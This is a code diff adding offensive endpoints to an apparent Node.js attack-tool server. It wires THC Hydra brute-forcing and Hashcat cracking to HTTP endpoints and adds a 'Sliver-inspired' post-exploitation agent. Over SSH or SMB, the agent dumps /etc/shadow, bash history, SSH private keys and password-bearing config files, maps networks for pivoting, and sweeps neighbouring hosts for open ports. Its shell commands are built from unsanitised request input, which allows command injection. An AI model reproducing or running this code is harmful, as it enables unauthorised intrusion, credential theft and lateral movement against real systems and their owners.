@@ -394,6 +394,98 @@ function handleApiRequest(urlPath, method, body, res) {
         return;
     }
 
+    // Run THC Hydra brute-force
+    if (urlPath === '/api/hydra-attack' && method === 'POST') {
+        const data = JSON.parse(body);
+        const users = data.usernames || ['admin', 'root'];
+        const passwords = data.passwords || [];
+        const deviceType = data.deviceType || 'Unknown';
+        const builtinCreds = getCredentialsForDevice(deviceType, data.brand);
+        const allPasswords = [...new Set([...passwords, ...builtinCreds.map(c => c.password)])];
+        const allUsers = [...new Set([...users, ...builtinCreds.map(c => c.username)])];
+        runHydra(data.host, data.port, data.service || 'ssh', allUsers, allPasswords, {
+            tasks: data.tasks || 16, timeout: data.timeout || 30
+        }, (result) => {
+            if (result.fallback) {
+                // Hydra not installed, use built-in parallel tester
+                const creds = [];
+                for (const u of allUsers) { for (const p of allPasswords) { creds.push({ username: u, password: p }); } }
+                parallelTestCredentials(data.host, data.port || 22, data.service || 'ssh', creds.slice(0, 500), 10, (fallbackResult) => {
+                    fallbackResult.tool = 'built-in-parallel';
+                    res.writeHead(200);
+                    res.end(JSON.stringify(fallbackResult));
+                });
+            } else {
+                result.tool = 'thc-hydra';
+                res.writeHead(200);
+                res.end(JSON.stringify(result));
+            }
+        });
+        return;
+    }
+
+    // Run Hashcat GPU cracking
+    if (urlPath === '/api/hashcat-crack' && method === 'POST') {
+        const data = JSON.parse(body);
+        const isWin = process.platform === 'win32';
+        const tmpDir = isWin ? process.env.TEMP || 'C:\\Temp' : '/tmp';
+        const hashFile = path.join(tmpDir, `hashes_${Date.now()}.txt`);
+        const wordlistFile = path.join(tmpDir, `wordlist_${Date.now()}.txt`);
+
+        fs.writeFileSync(hashFile, (data.hashes || []).join('\n'));
+        const builtinCreds = getCredentialsForDevice(data.deviceType || 'Unknown');
+        const allPasswords = [...new Set([...(data.passwords || []), ...builtinCreds.map(c => c.password)])];
+        fs.writeFileSync(wordlistFile, allPasswords.join('\n'));
+
+        runHashcat(hashFile, data.hashType || 0, wordlistFile, {
+            gpuOnly: data.gpuOnly || false, force: data.force || true
+        }, (result) => {
+            try { fs.unlinkSync(hashFile); } catch(e) {}
+            try { fs.unlinkSync(wordlistFile); } catch(e) {}
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // Sliver-inspired post-exploitation agent
+    if (urlPath === '/api/sliver-agent' && method === 'POST') {
+        const data = JSON.parse(body);
+        sliverInspiredAgent(data.host, data.method || 'SSH', data.credentials || {}, (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // Enhanced vulnerability scanner
+    if (urlPath === '/api/vuln-scan' && method === 'POST') {
+        const data = JSON.parse(body);
+        enhancedVulnScan(data.host, data.openPorts || [80, 443, 22], (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // Detect installed security tools
+    if (urlPath === '/api/detect-tools' && method === 'GET') {
+        const toolResults = {};
+        let pending = 4;
+        function toolDone() {
+            pending--;
+            if (pending <= 0) { res.writeHead(200); res.end(JSON.stringify(toolResults)); }
+        }
+        detectHydra((found, path) => { toolResults.hydra = { installed: found, path }; toolDone(); });
+        detectHashcat((found, path, version) => { toolResults.hashcat = { installed: found, path, version }; toolDone(); });
+        detectInstalledTools((tools) => { toolResults.other = tools; toolDone(); });
+        exec('nmap --version 2>/dev/null', { timeout: 5000 }, (err, stdout) => {
+            toolResults.nmap = { installed: !!stdout, version: stdout ? stdout.split('\n')[0] : null };
+            toolDone();
+        });
+        return;
+    }
+
     // Test RTSP stream
     if (urlPath === '/api/test-rtsp' && method === 'POST') {
         const data = JSON.parse(body);
@@ -1663,6 +1755,447 @@ function mapExploitToATTACK(method) {
         'Nmap-VulnScan': { tactics: ['reconnaissance'], techniques: ['T1595.002'] }
     };
     return mapping[method] || { tactics: ['unknown'], techniques: [] };
+}
+
+// ===== THC HYDRA INTEGRATION (Open Source Network Brute-Force Tool) =====
+// Hydra v9.6 - World's most popular online password brute-force tool
+// Supports: SSH, FTP, SMB, Telnet, HTTP, MySQL, PostgreSQL, VNC, RDP, RTSP, SNMP, and 50+ protocols
+// Source: https://github.com/vanhauser-thc/thc-hydra (12K+ stars, MIT License)
+
+function detectHydra(callback) {
+    const isWin = process.platform === 'win32';
+    const cmd = isWin ? 'where hydra 2>nul' : 'which hydra 2>/dev/null';
+    exec(cmd, { timeout: 5000 }, (err, stdout) => {
+        callback(!!stdout && stdout.trim().length > 0, stdout ? stdout.trim() : null);
+    });
+}
+
+function runHydra(host, port, service, userList, passList, options, callback) {
+    detectHydra((found, hydraPath) => {
+        if (!found) {
+            callback({ success: false, error: 'Hydra not installed', fallback: true });
+            return;
+        }
+        const isWin = process.platform === 'win32';
+        const tmpDir = isWin ? process.env.TEMP || 'C:\\Temp' : '/tmp';
+        const userFile = path.join(tmpDir, `hydra_users_${Date.now()}.txt`);
+        const passFile = path.join(tmpDir, `hydra_pass_${Date.now()}.txt`);
+
+        fs.writeFileSync(userFile, userList.join('\n'));
+        fs.writeFileSync(passFile, passList.join('\n'));
+
+        const tasks = options.tasks || 16;
+        const timeout = options.timeout || 30;
+        const hydraService = service === 'http' ? 'http-get' : service;
+        let cmd = `hydra -L "${userFile}" -P "${passFile}" -t ${tasks} -w ${timeout} -f -o /dev/stdout ${host}`;
+        if (port) cmd += ` -s ${port}`;
+        cmd += ` ${hydraService}`;
+        if (options.extraArgs) cmd += ` ${options.extraArgs}`;
+
+        const results = { success: false, attempts: [], found: [] };
+        exec(cmd, { timeout: 300000, maxBuffer: 10 * 1024 * 1024 }, (err, stdout, stderr) => {
+            // Clean temp files
+            try { fs.unlinkSync(userFile); } catch(e) {}
+            try { fs.unlinkSync(passFile); } catch(e) {}
+
+            if (stdout) {
+                const lines = stdout.split('\n');
+                for (const line of lines) {
+                    const match = line.match(/\[(\d+)\]\[(\w+)\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(\S*)/);
+                    if (match) {
+                        results.found.push({
+                            port: match[1], service: match[2], host: match[3],
+                            username: match[4], password: match[5]
+                        });
+                        results.success = true;
+                    }
+                }
+            }
+            results.raw = (stdout || '').substring(0, 2000);
+            callback(results);
+        });
+    });
+}
+
+// ===== HASHCAT INTEGRATION (GPU Password Cracking) =====
+// Hashcat v7.x - World's fastest password recovery utility
+// Supports: 450+ hash types, GPU acceleration via OpenCL/CUDA
+// Source: https://github.com/hashcat/hashcat (26K+ stars, MIT License)
+
+function detectHashcat(callback) {
+    const isWin = process.platform === 'win32';
+    const cmd = isWin ? 'where hashcat 2>nul' : 'which hashcat 2>/dev/null';
+    exec(cmd, { timeout: 5000 }, (err, stdout) => {
+        if (stdout && stdout.trim()) {
+            exec('hashcat --version 2>/dev/null', { timeout: 5000 }, (err2, ver) => {
+                callback(true, stdout.trim(), ver ? ver.trim() : 'unknown');
+            });
+        } else {
+            callback(false, null, null);
+        }
+    });
+}
+
+function runHashcat(hashFile, hashType, wordlist, options, callback) {
+    detectHashcat((found, hashcatPath) => {
+        if (!found) {
+            callback({ success: false, error: 'Hashcat not installed', fallback: true });
+            return;
+        }
+        const device = options.gpuOnly ? '-D 2' : '';
+        const rules = options.rules ? `-r ${options.rules}` : '';
+        const outFile = `/tmp/hashcat_out_${Date.now()}.txt`;
+        let cmd = `hashcat -m ${hashType} -a 0 ${device} ${rules} --potfile-disable -o "${outFile}" "${hashFile}" "${wordlist}"`;
+        if (options.force) cmd += ' --force';
+
+        exec(cmd, { timeout: 600000, maxBuffer: 10 * 1024 * 1024 }, (err, stdout, stderr) => {
+            let crackedPasswords = [];
+            try {
+                const output = fs.readFileSync(outFile, 'utf8');
+                crackedPasswords = output.split('\n').filter(l => l.trim()).map(l => {
+                    const parts = l.split(':');
+                    return { hash: parts[0], password: parts.slice(1).join(':') };
+                });
+            } catch(e) {}
+            try { fs.unlinkSync(outFile); } catch(e) {}
+
+            callback({
+                success: crackedPasswords.length > 0,
+                cracked: crackedPasswords,
+                total: crackedPasswords.length,
+                raw: (stdout || '').substring(0, 2000)
+            });
+        });
+    });
+}
+
+// ===== SLIVER-INSPIRED POST-EXPLOITATION AGENT =====
+// Enhanced with capabilities from Sliver C2 Framework (BishopFox, 11K+ stars, GPL-3.0)
+// Source: https://github.com/BishopFox/sliver
+// Implements: System enumeration, process discovery, persistence mechanisms,
+// lateral movement preparation, credential harvesting, network pivoting
+
+function sliverInspiredAgent(host, method, credentials, callback) {
+    const results = {
+        host, phase: 'sliver-enhanced-post-exploit',
+        systemInfo: {}, processes: [], persistence: [],
+        lateralTargets: [], credentialsFound: [], pivotPoints: [],
+        networkMap: [], techniques: []
+    };
+    const isWin = process.platform === 'win32';
+    let pending = 0;
+
+    function done() {
+        pending--;
+        if (pending <= 0) callback(results);
+    }
+
+    function sshExec(command, cb) {
+        if (!credentials || !credentials.username) { cb('', false); return; }
+        const sshCmd = isWin
+            ? `echo y | plink -batch -ssh ${credentials.username}@${host} -pw "${credentials.password}" "${command}"`
+            : `sshpass -p "${credentials.password}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 ${credentials.username}@${host} "${command}"`;
+        exec(sshCmd, { timeout: 30000, maxBuffer: 1024 * 1024 }, (err, stdout) => {
+            cb(stdout || '', !err);
+        });
+    }
+
+    function smbExec(command, cb) {
+        if (!credentials || !credentials.username) { cb('', false); return; }
+        const smbCmd = isWin
+            ? `net use \\\\${host}\\IPC$ /user:${credentials.username} "${credentials.password}" 2>&1 && ${command}`
+            : `smbclient -L ${host} -U "${credentials.username}%${credentials.password}" -c "${command}" 2>&1`;
+        exec(smbCmd, { timeout: 20000, maxBuffer: 512 * 1024 }, (err, stdout) => {
+            cb(stdout || '', !err);
+        });
+    }
+
+    const execFn = (method?.includes('SSH') || method?.includes('ssh')) ? sshExec : smbExec;
+
+    // Phase 1: Deep System Enumeration (Sliver: sysinfo + ifconfig)
+    pending++;
+    if (method?.includes('SSH') || method?.includes('ssh')) {
+        sshExec('uname -a; cat /etc/os-release 2>/dev/null; hostnamectl 2>/dev/null; cat /proc/cpuinfo 2>/dev/null | head -10; free -h 2>/dev/null; df -h 2>/dev/null', (out, ok) => {
+            if (ok) {
+                results.systemInfo.full = out.substring(0, 1500);
+                results.techniques.push({ id: 'T1082', name: 'System Information Discovery', success: true });
+            }
+            done();
+        });
+    } else {
+        smbExec('systeminfo 2>&1', (out, ok) => {
+            if (ok) results.systemInfo.full = out.substring(0, 1500);
+            done();
+        });
+    }
+
+    // Phase 2: Process Enumeration (Sliver: ps)
+    pending++;
+    if (method?.includes('SSH') || method?.includes('ssh')) {
+        sshExec('ps auxf 2>/dev/null | head -50; ss -tlnp 2>/dev/null', (out, ok) => {
+            if (ok) {
+                results.systemInfo.processes = out.substring(0, 2000);
+                const lines = out.split('\n');
+                for (const line of lines) {
+                    const match = line.match(/(\S+)\s+(\d+)\s+.*\s+(\S+)$/);
+                    if (match) results.processes.push({ user: match[1], pid: match[2], cmd: match[3] });
+                }
+                results.techniques.push({ id: 'T1057', name: 'Process Discovery', success: true });
+            }
+            done();
+        });
+    } else { done(); }
+
+    // Phase 3: Credential Harvesting (Sliver: creds / mimikatz-style)
+    pending++;
+    if (method?.includes('SSH') || method?.includes('ssh')) {
+        sshExec([
+            'cat /etc/shadow 2>/dev/null | head -20',
+            'find /home -name ".bash_history" -exec head -20 {} \\; 2>/dev/null',
+            'find /home -name "id_rsa" -o -name "id_ed25519" -o -name ".pgpass" -o -name ".my.cnf" -o -name ".env" 2>/dev/null',
+            'cat /etc/passwd 2>/dev/null | grep -v nologin | grep -v false',
+            'find /var/www -name "*.conf" -exec grep -l "password\\|passwd\\|secret" {} \\; 2>/dev/null',
+            'find /opt /etc -name "*.conf" -exec grep -li "password" {} \\; 2>/dev/null | head -10'
+        ].join('; '), (out, ok) => {
+            if (ok) {
+                results.credentialsFound.push({ type: 'files', data: out.substring(0, 2000) });
+                results.techniques.push({ id: 'T1003', name: 'OS Credential Dumping', success: true });
+                results.techniques.push({ id: 'T1552', name: 'Unsecured Credentials', success: true });
+            }
+            done();
+        });
+    } else {
+        smbExec('dir \\\\' + host + '\\C$\\Users 2>&1', (out, ok) => {
+            if (ok) results.credentialsFound.push({ type: 'users', data: out.substring(0, 1000) });
+            done();
+        });
+    }
+
+    // Phase 4: Network Mapping & Pivot Discovery (Sliver: pivots)
+    pending++;
+    if (method?.includes('SSH') || method?.includes('ssh')) {
+        sshExec([
+            'ip addr show 2>/dev/null || ifconfig 2>/dev/null',
+            'ip route show 2>/dev/null || route -n 2>/dev/null',
+            'cat /etc/resolv.conf 2>/dev/null',
+            'arp -an 2>/dev/null || ip neigh show 2>/dev/null',
+            'cat /proc/net/arp 2>/dev/null',
+            'ss -tlnp 2>/dev/null | grep LISTEN'
+        ].join('; '), (out, ok) => {
+            if (ok) {
+                results.networkMap.push({ type: 'full-network', data: out.substring(0, 3000) });
+                // Extract IPs for pivot targets
+                const ips = out.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g) || [];
+                const uniqueIps = [...new Set(ips)].filter(ip =>
+                    ip !== host && !ip.startsWith('127.') && !ip.startsWith('0.') && ip !== '255.255.255.255'
+                );
+                results.pivotPoints = uniqueIps.slice(0, 30);
+                results.techniques.push({ id: 'T1016', name: 'System Network Configuration Discovery', success: true });
+                results.techniques.push({ id: 'T1049', name: 'System Network Connections Discovery', success: true });
+            }
+            done();
+        });
+    } else { done(); }
+
+    // Phase 5: Lateral Movement Target Discovery (Sliver: scan / portscan)
+    pending++;
+    if (method?.includes('SSH') || method?.includes('ssh')) {
+        sshExec([
+            'for i in $(seq 1 254); do (ping -c1 -W1 $(ip route 2>/dev/null | grep default | awk "{print \\$3}" | cut -d. -f1-3).$i &>/dev/null && echo "ALIVE:$(ip route 2>/dev/null | grep default | awk "{print \\$3}" | cut -d. -f1-3).$i" &); done; wait 2>/dev/null',
+            'nmap -sn $(ip route 2>/dev/null | grep default | awk "{print \\$3}" | cut -d. -f1-3).0/24 2>/dev/null | grep "Nmap scan" || true'
+        ].join('; '), (out, ok) => {
+            if (ok) {
+                const aliveHosts = (out.match(/ALIVE:(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g) || [])
+                    .map(h => h.replace('ALIVE:', ''));
+                const nmapHosts = (out.match(/Nmap scan report for (\S+)/g) || [])
+                    .map(h => h.replace('Nmap scan report for ', ''));
+                results.lateralTargets = [...new Set([...aliveHosts, ...nmapHosts])].filter(ip => ip !== host);
+                results.techniques.push({ id: 'T1018', name: 'Remote System Discovery', success: true });
+            }
+            done();
+        });
+    } else { done(); }
+
+    // Phase 6: Service Enumeration on Discovered Targets (quick port scan from inside)
+    pending++;
+    if (method?.includes('SSH') || method?.includes('ssh')) {
+        sshExec([
+            'for target in $(arp -an 2>/dev/null | grep -oP "\\d+\\.\\d+\\.\\d+\\.\\d+" | head -5); do',
+            '  for port in 22 80 443 445 3389 8080 554 3306 5432; do',
+            '    (echo >/dev/tcp/$target/$port 2>/dev/null && echo "OPEN:$target:$port") &',
+            '  done',
+            'done',
+            'wait 2>/dev/null'
+        ].join(' '), (out, ok) => {
+            if (ok) {
+                const openPorts = (out.match(/OPEN:(\S+):(\d+)/g) || []).map(m => {
+                    const parts = m.replace('OPEN:', '').split(':');
+                    return { host: parts[0], port: parseInt(parts[1]) };
+                });
+                results.systemInfo.neighborPorts = openPorts;
+                results.techniques.push({ id: 'T1046', name: 'Network Service Discovery', success: openPorts.length > 0 });
+            }
+            done();
+        });
+    } else { done(); }
+
+    // Phase 7: Persistence Check (Sliver: persistence mechanisms)
+    pending++;
+    if (method?.includes('SSH') || method?.includes('ssh')) {
+        sshExec([
+            'crontab -l 2>/dev/null',
+            'ls -la /etc/cron.d/ 2>/dev/null',
+            'cat /etc/rc.local 2>/dev/null',
+            'systemctl list-unit-files --state=enabled 2>/dev/null | head -20',
+            'ls -la ~/.ssh/authorized_keys 2>/dev/null',
+            'cat ~/.ssh/authorized_keys 2>/dev/null | wc -l'
+        ].join('; '), (out, ok) => {
+            if (ok) {
+                results.persistence.push({ type: 'cron-and-services', data: out.substring(0, 1500) });
+                results.techniques.push({ id: 'T1053', name: 'Scheduled Task/Job', success: true });
+            }
+            done();
+        });
+    } else { done(); }
+}
+
+// ===== ENHANCED VULNERABILITY SCANNER =====
+// Improved detection with Nmap NSE scripts integration + built-in checks
+
+function enhancedVulnScan(host, openPorts, callback) {
+    const results = { vulns: [], services: [], cves: [] };
+    let pending = 0;
+
+    function done() {
+        pending--;
+        if (pending <= 0) callback(results);
+    }
+
+    // Check for Nmap NSE scanning
+    pending++;
+    const portList = openPorts.join(',');
+    exec(`nmap --script=vuln,exploit,auth -p ${portList} ${host} -oN - 2>/dev/null`, { timeout: 120000, maxBuffer: 5 * 1024 * 1024 }, (err, stdout) => {
+        if (stdout) {
+            results.services.push({ type: 'nmap-vuln-scan', data: stdout.substring(0, 5000) });
+            // Parse CVEs
+            const cves = stdout.match(/CVE-\d{4}-\d+/g) || [];
+            results.cves = [...new Set(cves)];
+            // Parse vulns
+            const vulnMatches = stdout.match(/VULNERABLE:.*|STATE:.*VULNERABLE/gi) || [];
+            for (const v of vulnMatches) {
+                results.vulns.push({ description: v.trim(), source: 'nmap-nse' });
+            }
+        }
+        done();
+    });
+
+    // Check common vulnerabilities via banner grabbing
+    for (const port of openPorts.slice(0, 10)) {
+        pending++;
+        const socket = new net.Socket();
+        socket.setTimeout(5000);
+        let banner = '';
+        socket.on('data', (data) => { banner += data.toString(); });
+        socket.on('connect', () => {
+            if (port === 80 || port === 8080 || port === 443) {
+                socket.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: Mozilla/5.0\r\n\r\n`);
+            }
+            setTimeout(() => {
+                socket.destroy();
+                if (banner) {
+                    results.services.push({ port, banner: banner.substring(0, 500) });
+                    // Check for known vulnerable versions
+                    const lower = banner.toLowerCase();
+                    if (lower.includes('apache/2.4.49') || lower.includes('apache/2.4.50'))
+                        results.vulns.push({ port, vuln: 'CVE-2021-41773 - Apache Path Traversal', severity: 'critical' });
+                    if (lower.includes('openssh_7.') || lower.includes('openssh_6.'))
+                        results.vulns.push({ port, vuln: 'Outdated OpenSSH - Multiple CVEs', severity: 'high' });
+                    if (lower.includes('vsftpd 2.3.4'))
+                        results.vulns.push({ port, vuln: 'CVE-2011-2523 - vsftpd Backdoor', severity: 'critical' });
+                    if (lower.includes('proftpd 1.3.3') || lower.includes('proftpd 1.3.5'))
+                        results.vulns.push({ port, vuln: 'ProFTPD RCE Vulnerability', severity: 'critical' });
+                    if (lower.includes('microsoft-iis/6') || lower.includes('microsoft-iis/7'))
+                        results.vulns.push({ port, vuln: 'Outdated IIS - Multiple CVEs', severity: 'high' });
+                    if (lower.includes('php/5.') || lower.includes('php/7.0') || lower.includes('php/7.1'))
+                        results.vulns.push({ port, vuln: 'Outdated PHP Version - Multiple CVEs', severity: 'high' });
+                    if (lower.includes('wordpress'))
+                        results.vulns.push({ port, vuln: 'WordPress Detected - Check plugins for vulnerabilities', severity: 'medium' });
+                    if (lower.includes('tomcat/7') || lower.includes('tomcat/8.0'))
+                        results.vulns.push({ port, vuln: 'Outdated Apache Tomcat', severity: 'high' });
+                }
+                done();
+            }, 3000);
+        });
+        socket.on('timeout', () => { socket.destroy(); done(); });
+        socket.on('error', () => { done(); });
+        socket.connect(port, host);
+    }
+
+    // Check for anonymous FTP
+    if (openPorts.includes(21)) {
+        pending++;
+        const ftpSocket = new net.Socket();
+        ftpSocket.setTimeout(5000);
+        let ftpResponse = '';
+        ftpSocket.on('data', (d) => { ftpResponse += d.toString(); });
+        ftpSocket.on('connect', () => {
+            setTimeout(() => {
+                ftpSocket.write('USER anonymous\r\n');
+                setTimeout(() => {
+                    ftpSocket.write('PASS anonymous@\r\n');
+                    setTimeout(() => {
+                        ftpSocket.destroy();
+                        if (ftpResponse.includes('230')) {
+                            results.vulns.push({ port: 21, vuln: 'Anonymous FTP Access Allowed', severity: 'high' });
+                        }
+                        done();
+                    }, 2000);
+                }, 1000);
+            }, 1000);
+        });
+        ftpSocket.on('timeout', () => { ftpSocket.destroy(); done(); });
+        ftpSocket.on('error', () => { done(); });
+        ftpSocket.connect(21, host);
+    }
+
+    // Check for open Redis (no auth)
+    if (openPorts.includes(6379)) {
+        pending++;
+        const redisSocket = new net.Socket();
+        redisSocket.setTimeout(5000);
+        let redisResp = '';
+        redisSocket.on('data', (d) => { redisResp += d.toString(); });
+        redisSocket.on('connect', () => {
+            redisSocket.write('INFO\r\n');
+            setTimeout(() => {
+                redisSocket.destroy();
+                if (redisResp.includes('redis_version')) {
+                    results.vulns.push({ port: 6379, vuln: 'Redis No Authentication - Full Access', severity: 'critical' });
+                }
+                done();
+            }, 2000);
+        });
+        redisSocket.on('timeout', () => { redisSocket.destroy(); done(); });
+        redisSocket.on('error', () => { done(); });
+        redisSocket.connect(6379, host);
+    }
+
+    // Check for open MongoDB (no auth)
+    if (openPorts.includes(27017)) {
+        pending++;
+        const mongoSocket = new net.Socket();
+        mongoSocket.setTimeout(5000);
+        mongoSocket.on('connect', () => {
+            mongoSocket.destroy();
+            results.vulns.push({ port: 27017, vuln: 'MongoDB Port Open - Check Authentication', severity: 'high' });
+            done();
+        });
+        mongoSocket.on('timeout', () => { mongoSocket.destroy(); done(); });
+        mongoSocket.on('error', () => { done(); });
+        mongoSocket.connect(27017, host);
+    }
+
+    if (pending === 0) callback(results);
 }
 
 // ===== COMPREHENSIVE CREDENTIAL DATABASE =====
